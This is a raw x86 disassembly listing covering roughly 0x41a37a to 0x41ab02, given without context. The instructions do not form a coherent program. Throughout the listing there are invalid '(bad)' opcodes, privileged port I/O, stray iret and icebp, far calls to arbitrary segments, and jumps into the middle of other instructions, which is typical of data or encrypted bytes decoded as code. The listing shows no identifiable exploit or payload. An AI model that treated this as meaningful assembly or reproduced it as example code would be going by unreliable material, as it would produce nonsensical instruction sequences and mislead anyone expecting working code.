  41a37a:	add    ebp,ebx
  41a37c:	clc    
  41a37d:	adc    al,0xbb
  41a37f:	fld    TBYTE PTR [edi-0x57]
  41a382:	inc    esp
  41a383:	(bad)  
  41a384:	pop    eax
  41a385:	repnz loope 0x41a350
  41a388:	rcl    BYTE PTR [ebp+0x128d0a63],cl
  41a38e:	inc    eax
  41a38f:	mov    ecx,0x65a5ac25
  41a394:	lock (bad) 
  41a396:	cmc    
  41a397:	inc    esi
  41a398:	repnz cmp ebp,DWORD PTR [ebp+edi*8+0x69f8864c]
  41a3a0:	sbb    al,0x15
  41a3a2:	sbb    al,0x48
  41a3a4:	call   0x57ca:0x2e3c62de
  41a3ab:	loopne 0x41a38a
  41a3ad:	xor    ah,ah
  41a3af:	(bad)  
  41a3b0:	out    dx,al
  41a3b1:	call   DWORD PTR [eax+0x60b1040b]
  41a3b7:	push   ss
  41a3b8:	xor    DWORD PTR [ebp+0x62],ecx
  41a3bb:	rcl    DWORD PTR [ecx],1
  41a3bd:	push   es
  41a3be:	div    bl
  41a3c0:	fnstenv [ebx-0x51]
  41a3c3:	sbb    cl,BYTE PTR [ebp+0x1b]
  41a3c6:	(bad)  
  41a3c7:	sub    BYTE PTR [edi],al
  41a3c9:	cmc    
  41a3ca:	add    ebx,DWORD PTR [edx]
  41a3cc:	repz pop esp
  41a3ce:	xor    ch,bl
  41a3d0:	jo     0x41a382
  41a3d2:	mov    dl,0xab
  41a3d4:	ins    BYTE PTR es:[edi],dx
  41a3d5:	into   
  41a3d6:	(bad)  
  41a3d7:	popf   
  41a3d8:	mov    ch,0x8a
  41a3da:	inc    esi
  41a3db:	sbb    BYTE PTR [ebx],dh
  41a3dd:	xchg   esp,eax
  41a3de:	(bad)  
  41a3df:	cmc    
  41a3e0:	fnstcw WORD PTR cs:[edx]
  41a3e3:	call   0xaeb:0x4e439369
  41a3ea:	out    dx,al
  41a3eb:	inc    ecx
  41a3ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3ed:	sbb    BYTE PTR [ecx+eax*4-0x5f],ch
  41a3f1:	test   BYTE PTR [ebp+0x62fe12bf],bl
  41a3f7:	add    DWORD PTR [ebx],ebx
  41a3f9:	aas    
  41a3fa:	mov    ah,bl
  41a3fc:	pusha  
  41a3fd:	aas    
  41a3fe:	std    
  41a3ff:	xchg   ebx,edi
  41a401:	sub    ebp,eax
  41a403:	or     ah,dh
  41a405:	out    0x39,eax
  41a407:	xchg   esi,eax
  41a408:	push   es
  41a409:	stos   DWORD PTR es:[edi],eax
  41a40a:	push   es
  41a40b:	into   
  41a40c:	(bad)  [edx]
  41a40e:	push   ebx
  41a40f:	or     BYTE PTR [ebx+0x68],0x65
  41a413:	in     al,0x1
  41a415:	imul   edx,DWORD PTR [edx-0x2d],0x5a
  41a419:	pop    dx
  41a41b:	cmp    BYTE PTR [ebx-0x5d897df7],0xc1
  41a422:	xchg   ebx,eax
  41a423:	xchg   BYTE PTR [ecx-0x7a41cfe4],cl
  41a429:	adc    cl,ch
  41a42b:	and    al,0x69
  41a42d:	pop    es
  41a42e:	add    al,0x26
  41a430:	(bad)  
  41a431:	bound  edi,QWORD PTR [esi]
  41a433:	rcl    BYTE PTR [ecx+0x133a768e],1
  41a439:	push   es
  41a43a:	dec    esp
  41a43b:	sbb    ebp,DWORD PTR [ecx]
  41a43d:	xchg   esi,eax
  41a43e:	inc    eax
  41a43f:	mov    bh,0xb4
  41a441:	xor    ah,BYTE PTR [ecx*8+0x68537746]
  41a448:	pop    ebx
  41a449:	lds    ebp,FWORD PTR [ebx]
  41a44b:	aam    0x7e
  41a44d:	loopne 0x41a4b7
  41a44f:	sub    DWORD PTR [edi],edi
  41a451:	gs xchg dh,bh
  41a454:	enter  0xdca5,0x22
  41a458:	xchg   esp,edi
  41a45a:	aas    
  41a45b:	sar    esp,0x23
  41a45e:	rcr    BYTE PTR [ebx],1
  41a460:	pop    edi
  41a461:	iret   
  41a462:	add    bh,bl
  41a464:	adc    DWORD PTR [edi+0x68071c3b],edi
  41a46a:	sbb    al,0xd3
  41a46c:	cld    
  41a46d:	mov    ds,WORD PTR [edi]
  41a46f:	call   0x9bcd:0x41256231
  41a476:	push   ss
  41a477:	mov    cl,0x35
  41a479:	cmp    eax,0xd1444833
  41a47e:	xchg   BYTE PTR [edx-0x11c80486],ah
  41a484:	pop    eax
  41a485:	mov    edx,DWORD PTR [esi-0x28e908d0]
  41a48b:	inc    esp
  41a48c:	push   cs
  41a48d:	(bad)  [esi+0x6a]
  41a490:	pop    ecx
  41a491:	sub    al,0x78
  41a493:	es push ds
  41a495:	mov    ebp,0xe4c3f14b
  41a49a:	(bad)  
  41a49c:	add    dl,BYTE PTR [edx+0x21cb9fd7]
  41a4a2:	lahf   
  41a4a3:	sub    cl,dl
  41a4a5:	stc    
  41a4a6:	inc    esi
  41a4a7:	mov    ebp,0x2e870a6c
  41a4ac:	xor    BYTE PTR [esi+0x5b3924b9],cl
  41a4b2:	xor    BYTE PTR [edx-0x17],ch
  41a4b5:	xor    al,0x1c
  41a4b7:	or     al,0x3f
  41a4b9:	pushf  
  41a4ba:	scas   eax,DWORD PTR es:[edi]
  41a4bb:	test   eax,0x36a2d303
  41a4c0:	adc    eax,0x985afb4
  41a4c5:	test   DWORD PTR [eax+eax*2+0xc],esi
  41a4c9:	pusha  
  41a4ca:	test   al,0x81
  41a4cc:	or     ebx,ecx
  41a4ce:	popf   
  41a4cf:	inc    esi
  41a4d0:	ins    BYTE PTR es:[edi],dx
  41a4d1:	push   0x45432dfe
  41a4d6:	gs call 0x5815:0x1de0f204
  41a4de:	jle    0x41a510
  41a4e0:	or     ah,BYTE PTR [ecx+edx*4+0x3bf604d9]
  41a4e7:	or     BYTE PTR [ecx+0x4f],cl
  41a4ea:	sub    eax,0x7f5276b2
  41a4ef:	jae    0x41a4bd
  41a4f1:	into   
  41a4f2:	and    eax,0xa6677170
  41a4f7:	outs   dx,BYTE PTR ds:[esi]
  41a4f8:	dec    edx
  41a4f9:	xor    cl,cl
  41a4fb:	jbe    0x41a486
  41a4fd:	ror    DWORD PTR [ebx-0x22],1
  41a500:	sti    
  41a501:	inc    esi
  41a502:	xchg   esi,eax
  41a503:	mov    edx,0x65d4d2ba
  41a508:	clc    
  41a509:	(bad)  
  41a50a:	xchg   edx,eax
  41a50b:	pop    esi
  41a50c:	mov    DWORD PTR [ebx],eax
  41a50e:	inc    esp
  41a50f:	xor    al,0xac
  41a511:	je     0x41a57b
  41a513:	stos   DWORD PTR es:[edi],eax
  41a514:	sub    al,0x22
  41a516:	mov    al,ds:0xdde1c75f
  41a51b:	mov    dh,0xc2
  41a51d:	sub    cl,BYTE PTR [esp+ecx*8]
  41a520:	dec    esp
  41a521:	cli    
  41a522:	iret   
  41a523:	js     0x41a569
  41a525:	inc    ecx
  41a526:	push   ss
  41a527:	data16 test al,0x5c
  41a52a:	nop
  41a52b:	sub    al,0x7d
  41a52d:	dec    ebp
  41a52e:	jl     0x41a4ed
  41a530:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a531:	jne    0x41a57c
  41a533:	in     eax,0xd9
  41a535:	push   ss
  41a536:	mov    bl,0x81
  41a538:	clc    
  41a539:	cmp    bl,BYTE PTR [ecx]
  41a53b:	add    al,0x25
  41a53d:	jp     0x41a4ef
  41a53f:	xor    eax,0x19a937de
  41a544:	jbe    0x41a50d
  41a546:	ror    DWORD PTR [ecx],cl
  41a548:	inc    BYTE PTR [ecx+0x3079328b]
  41a54e:	adc    BYTE PTR [ebx+0x60],dh
  41a551:	mov    ebx,0xda12926c
  41a556:	in     al,dx
  41a557:	push   esi
  41a558:	pop    ebx
  41a559:	pop    ds
  41a55a:	test   al,0xd2
  41a55c:	pop    esi
  41a55d:	(bad)  
  41a55e:	shl    DWORD PTR [esi+0x69],0x92
  41a562:	retf   
  41a563:	jnp    0x41a5d5
  41a565:	or     ecx,DWORD PTR ds:0x587144f1
  41a56b:	dec    esi
  41a56c:	sub    DWORD PTR [eax+0x5b],edi
  41a56f:	std    
  41a570:	out    dx,eax
  41a571:	repnz lods al,BYTE PTR ds:[esi]
  41a573:	jl     0x41a4f7
  41a575:	mov    esi,0x165984d9
  41a57a:	bound  esi,QWORD PTR [eax]
  41a57c:	push   esp
  41a57d:	add    ch,BYTE PTR [edi-0x7d]
  41a580:	icebp  
  41a581:	sahf   
  41a582:	scas   al,BYTE PTR es:[edi]
  41a583:	dec    esi
  41a584:	inc    esi
  41a585:	popf   
  41a586:	xchg   edx,eax
  41a587:	cs pop ebx
  41a589:	pop    edi
  41a58a:	xor    DWORD PTR [esi+ebp*8],ebp
  41a58d:	push   es
  41a58e:	pop    ebx
  41a58f:	pop    ss
  41a590:	call   0x7d2d:0x26695d3f
  41a597:	sbb    BYTE PTR [ebp+0x403a40f8],al
  41a59d:	aas    
  41a59e:	int    0x28
  41a5a0:	lea    ebx,[edi-0x66]
  41a5a3:	imul   ebx,edx,0xffffffa5
  41a5a6:	outs   dx,BYTE PTR ds:[esi]
  41a5a7:	mov    ecx,0xc8dad379
  41a5ac:	jno    0x41a5c9
  41a5ae:	dec    ebp
  41a5af:	push   edx
  41a5b0:	in     al,0x76
  41a5b2:	inc    edx
  41a5b3:	or     dh,BYTE PTR [ecx+0x72]
  41a5b6:	adc    DWORD PTR [edi+0x47f1c060],0x68fb45ac
  41a5c0:	outs   dx,DWORD PTR ds:[esi]
  41a5c1:	or     eax,ebx
  41a5c3:	mov    esp,0x5e178c28
  41a5c8:	stc    
  41a5c9:	sub    al,0x23
  41a5cb:	dec    edi
  41a5cc:	mov    cl,0xc7
  41a5ce:	fdivr  DWORD PTR [edx+0x15]
  41a5d1:	iret   
  41a5d2:	dec    ecx
  41a5d3:	xor    DWORD PTR [ebx],0x22
  41a5d6:	add    cl,bl
  41a5d8:	mov    dl,BYTE PTR [ebp+eiz*1+0x7b59c77d]
  41a5df:	or     eax,0x81b2319a
  41a5e4:	mov    dh,0x4f
  41a5e6:	push   0x2e744f54
  41a5eb:	add    al,0x59
  41a5ed:	push   edx
  41a5ee:	sbb    al,0xca
  41a5f0:	jae    0x41a644
  41a5f2:	lahf   
  41a5f3:	retf   0xf816
  41a5f6:	dec    esp
  41a5f7:	sub    eax,0xf4d23239
  41a5fc:	lea    edx,[edx-0x1694a9bd]
  41a602:	sub    BYTE PTR [eax-0x55],cl
  41a605:	in     al,dx
  41a606:	icebp  
  41a607:	ficomp DWORD PTR [edi+0x3f61b70e]
  41a60d:	ins    DWORD PTR es:[edi],dx
  41a60e:	call   DWORD PTR [edx+edx*8-0x76]
  41a612:	fisub  DWORD PTR [ebx]
  41a614:	jmp    0x41a618
  41a616:	inc    edi
  41a617:	push   esp
  41a618:	mov    ebx,0x43c7ebdc
  41a61d:	rcr    ebp,1
  41a61f:	push   edx
  41a620:	iret   
  41a621:	xchg   BYTE PTR [di],ah
  41a624:	or     DWORD PTR [eax],eax
  41a626:	xchg   ebp,eax
  41a627:	repnz call 0xf2e:0x32b66c81
  41a62f:	jmp    0x41a5fc
  41a631:	in     al,dx
  41a632:	and    BYTE PTR [edx+0x28d9f10a],al
  41a638:	ficom  DWORD PTR [edx+0x1e]
  41a63b:	(bad)  
  41a63c:	ins    BYTE PTR es:[edi],dx
  41a63d:	data16 (bad) 
  41a63f:	out    0xc5,al
  41a641:	sbb    cl,BYTE PTR [edi+0x71]
  41a644:	and    BYTE PTR [edi-0x36],0x46
  41a648:	pop    ecx
  41a649:	mov    al,ds:0x401fc1bd
  41a64e:	cld    
  41a64f:	shl    DWORD PTR [edi+edx*4+0x1318fdee],cl
  41a656:	mov    WORD PTR [edi-0x77606a88],fs
  41a65c:	test   BYTE PTR [ecx+0x696e7b30],cl
  41a662:	sbb    BYTE PTR [edi-0x4f7c15ab],bl
  41a668:	int    0xdf
  41a66a:	jg     0x41a6cf
  41a66c:	pop    ebp
  41a66d:	lods   eax,DWORD PTR ds:[esi]
  41a66e:	sbb    eax,0x810f8f51
  41a673:	push   esp
  41a674:	dec    ebp
  41a675:	in     eax,dx
  41a676:	jp     0x41a6da
  41a678:	mov    ch,0x16
  41a67a:	add    al,0x8f
  41a67c:	mov    esi,0x830a369b
  41a681:	adc    esi,DWORD PTR [ebp+0x3ba23638]
  41a687:	in     al,0x14
  41a689:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a68a:	mov    ebx,0xf8cb2f01
  41a68f:	mov    ds:0x5750ce02,eax
  41a694:	jo     0x41a683
  41a696:	clc    
  41a697:	push   esp
  41a698:	or     DWORD PTR [edi-0x7b],esi
  41a69b:	in     al,dx
  41a69c:	stos   DWORD PTR es:[edi],eax
  41a69d:	adc    al,0xda
  41a69f:	jno    0x41a6b6
  41a6a1:	sbb    dh,BYTE PTR [edi-0x61]
  41a6a4:	adc    eax,0x9a45deeb
  41a6a9:	and    ebx,ebx
  41a6ab:	push   es
  41a6ac:	mov    ah,0xe3
  41a6ae:	cmp    esi,ebx
  41a6b0:	ror    DWORD PTR [eax-0x1],1
  41a6b3:	mov    eax,ds:0x19364a17
  41a6b8:	icebp  
  41a6b9:	in     al,0x78
  41a6bb:	ret    
  41a6bc:	and    edi,esi
  41a6be:	mov    ebp,0xf41ec4b0
  41a6c3:	ds scas al,BYTE PTR es:[edi]
  41a6c5:	mov    ah,0x23
  41a6c7:	dec    esp
  41a6c8:	cld    
  41a6c9:	ja     0x41a681
  41a6cb:	loop   0x41a6cb
  41a6cd:	mov    esi,eax
  41a6cf:	not    dl
  41a6d1:	js     0x41a747
  41a6d3:	mov    ecx,0xe226cd92
  41a6d8:	inc    ecx
  41a6d9:	mov    BYTE PTR [ebp-0x26e93937],al
  41a6df:	mov    al,0x84
  41a6e1:	xchg   BYTE PTR ds:0xa461d7ed,bl
  41a6e7:	(bad)  
  41a6e8:	fld    st(5)
  41a6ea:	mov    esp,0x953617eb
  41a6ef:	and    dh,al
  41a6f1:	icebp  
  41a6f2:	fistp  WORD PTR [edi]
  41a6f4:	mov    bl,0xaa
  41a6f6:	iret   
  41a6f7:	cmp    eax,0xb809d72c
  41a6fc:	or     cl,dl
  41a6fe:	aam    0x8b
  41a700:	and    eax,0x90969848
  41a705:	inc    ebx
  41a706:	fnstsw WORD PTR [edx+0x7f6c1504]
  41a70c:	xlat   BYTE PTR ds:[ebx]
  41a70d:	add    ch,al
  41a70f:	jle    0x41a695
  41a711:	inc    ebx
  41a712:	adc    DWORD PTR [edx-0xb0c6dfc],ecx
  41a718:	lods   al,BYTE PTR ds:[esi]
  41a719:	pop    ebx
  41a71a:	cld    
  41a71b:	pop    ds
  41a71c:	mov    ds:0x3207becd,al
  41a721:	xchg   ebx,eax
  41a722:	push   0x74
  41a724:	mov    ah,0x49
  41a726:	call   0x6a04:0xce6f35b5
  41a72d:	xchg   esi,eax
  41a72e:	shr    DWORD PTR [ebx-0x1884f78f],cl
  41a734:	into   
  41a735:	js     0x41a711
  41a737:	push   cs
  41a738:	xor    dl,cl
  41a73a:	popa   
  41a73b:	jg     0x41a6f9
  41a73d:	pop    ebx
  41a73e:	xchg   BYTE PTR [edx+eax*4-0x12990a9b],ch
  41a745:	jae    0x41a705
  41a747:	pop    ebp
  41a748:	fadd   QWORD PTR [ebp-0xb]
  41a74b:	sbb    DWORD PTR [ebx+0x4b],0xcedba591
  41a752:	xor    DWORD PTR [edi],ebp
  41a754:	inc    eax
  41a755:	call   0x8edb1f0a
  41a75a:	dec    esi
  41a75b:	jp     0x41a7a7
  41a75d:	imul   edi,eax,0x5876e5a7
  41a763:	xchg   esp,eax
  41a764:	into   
  41a765:	sub    BYTE PTR [edi],0x73
  41a768:	jl     0x41a721
  41a76a:	ja     0x41a753
  41a76c:	inc    esi
  41a76d:	sub    al,0xa0
  41a76f:	adc    cl,BYTE PTR [ebx]
  41a771:	mov    eax,0x98367389
  41a776:	mov    bl,0xef
  41a778:	test   BYTE PTR [ebp*4+0x53e55ccd],cl
  41a77f:	and    BYTE PTR [edx+ebx*8+0x467ba2a9],al
  41a786:	adc    eax,0xadf26ced
  41a78b:	(bad)  
  41a78c:	aad    0x9f
  41a78e:	ins    BYTE PTR es:[edi],dx
  41a78f:	ret    
  41a790:	call   0xd9b0:0xdc2d9aec
  41a797:	push   ss
  41a798:	sub    bl,BYTE PTR [ebx+0x4a]
  41a79b:	test   ecx,esi
  41a79d:	and    al,0x82
  41a79f:	int3   
  41a7a0:	aam    0x1d
  41a7a2:	rcr    BYTE PTR ds:0xcc6c0626,cl
  41a7a8:	dec    edx
  41a7a9:	ja     0x41a7a6
  41a7ab:	xchg   esi,eax
  41a7ac:	scas   eax,DWORD PTR es:[edi]
  41a7ad:	mov    esp,0xbd99afeb
  41a7b2:	jg     0x41a74f
  41a7b4:	fs sbb eax,0x9d4e4428
  41a7ba:	jns    0x41a769
  41a7bc:	push   cs
  41a7bd:	mov    ebp,0x4ca5af56
  41a7c2:	in     al,dx
  41a7c3:	idiv   dh
  41a7c5:	repnz inc ecx
  41a7c7:	mov    edx,0x384dc0ab
  41a7cc:	out    0xf8,eax
  41a7ce:	in     eax,dx
  41a7cf:	mov    gs,edi
  41a7d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7d2:	pop    edx
  41a7d3:	dec    esi
  41a7d4:	iret   
  41a7d5:	cmp    BYTE PTR [eax+0x78],0x51
  41a7d9:	adc    DWORD PTR [edi-0x3469b9c8],edi
  41a7df:	xchg   BYTE PTR [esi],bl
  41a7e1:	mov    ah,bl
  41a7e3:	sbb    bh,dl
  41a7e5:	jb     0x41a836
  41a7e7:	fldenv [edi-0x3b]
  41a7ea:	ret    0x42d9
  41a7ed:	in     eax,dx
  41a7ee:	push   ss
  41a7ef:	add    BYTE PTR [eax],cl
  41a7f1:	dec    eax
  41a7f2:	nop
  41a7f3:	add    cl,BYTE PTR gs:[esi-0x2590cffd]
  41a7fa:	and    esi,ebp
  41a7fc:	and    bl,BYTE PTR [eax-0x18]
  41a7ff:	pop    ebp
  41a800:	ds jp  0x41a800
  41a803:	mov    eax,0xa20c9a68
  41a808:	mov    cs,WORD PTR [ebp+0x1e]
  41a80b:	and    cl,BYTE PTR [edx-0x3e1356f2]
  41a811:	mov    eax,ds:0x114ceeb1
  41a816:	stos   DWORD PTR es:[edi],eax
  41a817:	(bad)  
  41a819:	push   0x624082e7
  41a81e:	dec    eax
  41a81f:	(bad)  
  41a820:	mov    al,0x9b
  41a822:	mov    eax,0xf788645f
  41a827:	jmp    0x7d85:0xc92482ca
  41a82e:	std    
  41a82f:	push   0xffffff8b
  41a831:	cwde   
  41a832:	jno    0x41a839
  41a834:	sub    DWORD PTR [edi+0x33f17f4b],ebp
  41a83a:	or     edx,DWORD PTR [eax-0x5650d225]
  41a840:	mov    dh,0xe7
  41a842:	js     0x41a8a0
  41a844:	inc    ebx
  41a845:	mul    BYTE PTR [ecx]
  41a847:	push   ecx
  41a849:	mov    eax,ds:0xc552cce4
  41a84e:	sbb    DWORD PTR [edi+0x51ab4ca0],ebp
  41a854:	repz cmp edx,DWORD PTR [edx-0x67]
  41a858:	lods   al,BYTE PTR ds:[esi]
  41a859:	push   ds
  41a85a:	mov    ds:0x7b857582,eax
  41a85f:	or     bl,BYTE PTR [edi+0x25346214]
  41a865:	add    al,0x70
  41a867:	or     eax,0x21c3e110
  41a86c:	cmc    
  41a86d:	inc    esp
  41a86e:	bound  ecx,QWORD PTR [edi+0x528e83bc]
  41a874:	pop    edi
  41a875:	push   es
  41a876:	pop    ebp
  41a877:	sbb    dl,BYTE PTR [edx]
  41a879:	sbb    ch,BYTE PTR [edi-0x28]
  41a87c:	popa   
  41a87d:	ror    BYTE PTR [edi+esi*1+0x32],1
  41a881:	jbe    0x41a861
  41a883:	fwait
  41a884:	dec    edi
  41a885:	ja     0x41a87e
  41a887:	xchg   ebp,eax
  41a888:	push   cs
  41a889:	ja     0x41a8ea
  41a88b:	dec    edi
  41a88c:	shr    DWORD PTR ds:[edi-0x41],0x4f
  41a891:	stos   DWORD PTR es:[edi],eax
  41a892:	xchg   al,bh
  41a894:	je     0x41a873
  41a896:	cmp    DWORD PTR [eax+eax*4],eax
  41a899:	(bad)  
  41a89a:	mov    ch,0xce
  41a89c:	adc    ah,0xb0
  41a89f:	not    edi
  41a8a1:	inc    edx
  41a8a2:	add    eax,0x3230efaa
  41a8a7:	pop    DWORD PTR [eax+0x58]
  41a8aa:	call   0x94cacadc
  41a8af:	retf   0xc711
  41a8b2:	lea    ebx,[ecx]
  41a8b4:	jmp    DWORD PTR [ecx+0x4a]
  41a8b7:	into   
  41a8b8:	mov    dh,0xa0
  41a8ba:	test   eax,0x916ff482
  41a8bf:	add    ecx,0x1b6b570a
  41a8c5:	aam    0x59
  41a8c7:	xor    BYTE PTR [eax],0x2e
  41a8ca:	in     al,0xc4
  41a8cc:	(bad)  
  41a8cd:	and    eax,0xf5ae9d82
  41a8d2:	les    esp,FWORD PTR [esi]
  41a8d4:	xchg   DWORD PTR [eax],edx
  41a8d6:	dec    esp
  41a8d7:	js     0x41a88a
  41a8d9:	sbb    DWORD PTR [ebx-0xcfb2f67],0x6c
  41a8e0:	in     al,0xe2
  41a8e2:	cmp    BYTE PTR [esi+0x5271d77b],bh
  41a8e8:	aaa    
  41a8e9:	out    0xa9,al
  41a8eb:	loope  0x41a8ce
  41a8ed:	lods   al,BYTE PTR ds:[esi]
  41a8ee:	mov    eax,ds:0xf8b34ff7
  41a8f3:	inc    edx
  41a8f4:	adc    ch,ah
  41a8f6:	push   esi
  41a8f7:	pop    esi
  41a8f8:	push   edi
  41a8f9:	lea    ebp,[ebp+eax*4-0x16b6f11e]
  41a900:	call   0x378c6b6a
  41a905:	and    dh,BYTE PTR [ebx-0x4b]
  41a908:	imul   esp,DWORD PTR [ecx-0x75],0x44
  41a90c:	push   es
  41a90d:	xchg   BYTE PTR [edx-0x3d],dl
  41a910:	push   esi
  41a911:	enter  0x1bb8,0xef
  41a915:	or     al,0x33
  41a917:	adc    eax,0xe2d7e7e0
  41a91c:	mov    ebp,0x14f3bd3
  41a921:	out    0x8,eax
  41a923:	aas    
  41a924:	fstp   QWORD PTR [edx+0x440121ac]
  41a92a:	fldcw  WORD PTR [eax]
  41a92c:	jae    0x41a974
  41a92e:	inc    edi
  41a92f:	nop
  41a930:	fdivr  DWORD PTR [edi]
  41a932:	stos   BYTE PTR es:[edi],al
  41a933:	pop    esp
  41a934:	push   eax
  41a935:	inc    edx
  41a936:	push   0x7a
  41a938:	jmp    0x83393137
  41a93d:	bound  edi,QWORD PTR [ebx-0x7651b02a]
  41a943:	imul   ebx,DWORD PTR [esi+0x13c4cb88],0xffffffe3
  41a94a:	mov    ebp,0xc78f5aa4
  41a94f:	scas   al,BYTE PTR es:[edi]
  41a950:	mov    esp,eax
  41a952:	dec    ebp
  41a953:	fisttp WORD PTR [ebp-0x6c9c32c3]
  41a959:	call   0xa68d:0x569e17ef
  41a960:	adc    eax,0x21b271a
  41a965:	adc    eax,0xfafd72df
  41a96a:	xchg   BYTE PTR [edi],cl
  41a96c:	jecxz  0x41a9cd
  41a96e:	sbb    ebp,ebx
  41a970:	push   ebp
  41a971:	jmp    0xe645:0x8130ab49
  41a978:	inc    BYTE PTR [edx]
  41a97a:	and    esp,edi
  41a97c:	pop    esi
  41a97d:	pop    esp
  41a97e:	es jle 0x41a9a6
  41a981:	and    BYTE PTR [ebp+eiz*8-0x4f],0x11
  41a986:	in     eax,dx
  41a987:	clc    
  41a988:	aaa    
  41a989:	jbe    0x41a97e
  41a98b:	and    eax,0x1030d1a5
  41a990:	jb     0x41a96a
  41a992:	xor    eax,0xf8a9f829
  41a997:	pushf  
  41a998:	popa   
  41a999:	add    al,0xec
  41a99b:	jmp    0x41a96b
  41a99d:	mov    ds:0x517c9ea7,eax
  41a9a2:	dec    esi
  41a9a3:	pop    esp
  41a9a4:	xchg   BYTE PTR ds:[ebx-0x16],bh
  41a9a8:	and    eax,DWORD PTR [ebp+eax*1-0x13f26d3a]
  41a9af:	mov    al,ds:0x34300ebe
  41a9b4:	addr16 mov ah,0x93
  41a9b7:	mov    ds:0x99873d49,al
  41a9bc:	mov    al,0x15
  41a9be:	xor    ebp,DWORD PTR [eax]
  41a9c0:	inc    ebp
  41a9c1:	pop    es
  41a9c2:	(bad)  
  41a9c3:	mov    bl,0x66
  41a9c5:	push   ebx
  41a9c6:	ins    WORD PTR es:[edi],dx
  41a9c8:	pop    ss
  41a9c9:	test   BYTE PTR [ecx+edi*2-0x42],bl
  41a9cd:	loope  0x41a9ff
  41a9cf:	jl     0x41a98f
  41a9d1:	stos   DWORD PTR es:[edi],eax
  41a9d2:	adc    BYTE PTR [eax+0x4f],cl
  41a9d5:	and    edx,DWORD PTR [edx-0x5959cefe]
  41a9db:	inc    esi
  41a9dc:	je     0x41a960
  41a9de:	fcomi  st,st(0)
  41a9e0:	cmp    ch,BYTE PTR [ebp+0x68]
  41a9e3:	shl    DWORD PTR [ebx-0x46],1
  41a9e6:	lods   al,BYTE PTR ds:[esi]
  41a9e7:	jp     0x41a9f9
  41a9e9:	daa    
  41a9ea:	fnstcw WORD PTR [eax]
  41a9ec:	out    dx,al
  41a9ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9ee:	repnz adc BYTE PTR [eax-0x3beba957],cl
  41a9f5:	mov    edi,0x60e17441
  41a9fa:	or     bh,BYTE PTR gs:[ebp-0x135d3277]
  41aa01:	mov    ds:0x3f6bc000,eax
  41aa07:	sbb    DWORD PTR [ecx-0x51caaa8],eax
  41aa0d:	stos   BYTE PTR es:[edi],al
  41aa0e:	mov    ds:0x74298e80,al
  41aa13:	out    dx,al
  41aa14:	test   al,0x4b
  41aa16:	ins    BYTE PTR es:[edi],dx
  41aa17:	sbb    DWORD PTR [ecx+0x45820097],0x51
  41aa1e:	out    0xdb,al
  41aa20:	mov    edx,0xdc1f4d3c
  41aa25:	mov    dl,0xb
  41aa27:	nop
  41aa28:	inc    esp
  41aa29:	(bad)  
  41aa2a:	or     ecx,edi
  41aa2c:	push   cs
  41aa2d:	push   ecx
  41aa2e:	je     0x41aa44
  41aa30:	ret    0x240f
  41aa33:	stos   DWORD PTR es:[edi],eax
  41aa34:	retf   0x101c
  41aa37:	adc    ch,ah
  41aa39:	jns    0x41aaa4
  41aa3b:	arpl   WORD PTR [eax-0x54],bp
  41aa3e:	mov    ebp,0xe2db27a9
  41aa43:	outs   dx,DWORD PTR ds:[esi]
  41aa44:	adc    al,0x3c
  41aa46:	js     0x41aa26
  41aa48:	sub    BYTE PTR [ebp-0x237c5f13],bh
  41aa4e:	int    0xa2
  41aa50:	xchg   edx,eax
  41aa51:	and    ch,BYTE PTR [bx+di-0x473f]
  41aa56:	mov    ebx,0x595bc06
  41aa5b:	(bad)  
  41aa5c:	test   dh,0x78
  41aa5f:	xchg   BYTE PTR [edx],ch
  41aa61:	sbb    DWORD PTR [edx],ecx
  41aa63:	push   edi
  41aa64:	fs sub dl,dh
  41aa67:	enter  0xf66c,0xde
  41aa6b:	test   al,0xd2
  41aa6d:	xor    al,BYTE PTR [ecx]
  41aa6f:	push   ebp
  41aa70:	xchg   ecx,eax
  41aa71:	int3   
  41aa72:	xchg   esp,eax
  41aa73:	in     al,dx
  41aa74:	in     eax,0x61
  41aa76:	ret    0xe612
  41aa79:	dec    ebp
  41aa7a:	xchg   edx,eax
  41aa7b:	(bad)  
  41aa7c:	push   ebp
  41aa7d:	call   0x4cbe:0xc521c6d0
  41aa84:	fsub   DWORD PTR [esi-0x30165014]
  41aa8a:	push   ss
  41aa8b:	inc    ebx
  41aa8c:	dec    esi
  41aa8d:	fcomp  QWORD PTR [ebx+0x33df1bf]
  41aa93:	sbb    al,0x1
  41aa95:	bound  ebx,QWORD PTR [eax]
  41aa97:	pop    edi
  41aa98:	aad    0xf3
  41aa9a:	xor    eax,0x14dc945
  41aa9f:	mov    dh,0x6
  41aaa1:	cld    
  41aaa2:	cld    
  41aaa3:	loope  0x41aa94
  41aaa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aaa6:	(bad)  
  41aaa7:	jns    0x41aa3f
  41aaa9:	outs   dx,BYTE PTR ds:[esi]
  41aaaa:	pusha  
  41aaab:	pop    ss
  41aaac:	in     al,0x1c
  41aaae:	sub    DWORD PTR [esi+0x57],eax
  41aab1:	sbb    ebp,DWORD PTR [ebp-0x58]
  41aab4:	adc    al,0xae
  41aab6:	test   DWORD PTR [esi+0x2],ebx
  41aab9:	cdq    
  41aaba:	cmp    bl,BYTE PTR [esi+0x7f]
  41aabd:	mov    ah,BYTE PTR [edi-0x66df450a]
  41aac3:	jg     0x41aa8e
  41aac5:	and    esi,DWORD PTR [edi-0x78a7a066]
  41aacb:	iret   
  41aacc:	mov    dh,0xfd
  41aace:	ret    
  41aacf:	nop
  41aad0:	pop    ss
  41aad1:	mov    bh,0x15
  41aad3:	sahf   
  41aad4:	jmp    0xd80ba673
  41aad9:	and    BYTE PTR [edi],0x24
  41aadc:	push   eax
  41aadd:	sbb    BYTE PTR [edi-0x79],dl
  41aae0:	mov    ecx,0x3699f616
  41aae5:	mov    ch,BYTE PTR [eax]
  41aae7:	xchg   edx,eax
  41aae8:	addr16 jge 0x41ab1c
  41aaeb:	mov    ds,WORD PTR ds:0xdf6e620
  41aaf1:	push   edi
  41aaf2:	stc    
  41aaf3:	std    
  41aaf4:	call   0x3f09a4e
  41aaf9:	push   eax
  41aafa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aafb:	test   al,0x4d
  41aafd:	fld    TBYTE PTR [ebp-0x18]
  41ab00:	repnz sahf 
  41ab02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
